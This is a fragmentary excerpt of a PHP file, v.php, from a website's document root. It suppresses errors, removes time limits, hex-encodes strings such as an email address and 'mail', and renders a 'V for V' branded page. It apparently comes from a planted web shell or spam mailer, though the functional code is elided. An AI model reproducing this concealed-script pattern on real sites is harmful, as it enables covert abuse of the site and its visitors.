...
Filename: C:\www\dcaroinc.com/httpdocs/-/v.php
<?php
ob_start();
set_time_limit(0);
error_reporting(0);
...
$f_Array = [
	...
	"6974736166616b65656d61696c406578656d706c652e636f6d",
	"6d61696c"
	];
$fores = count($f_Array);
for($i=0; $i < $fores; $i++){
    ...
    <div class="container">
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand" href="#">
                <img src="//dcaroinc.com/-/v.png" width="200" height="50" class="d-inline-block align-top auto" alt="V for V">
            </a>
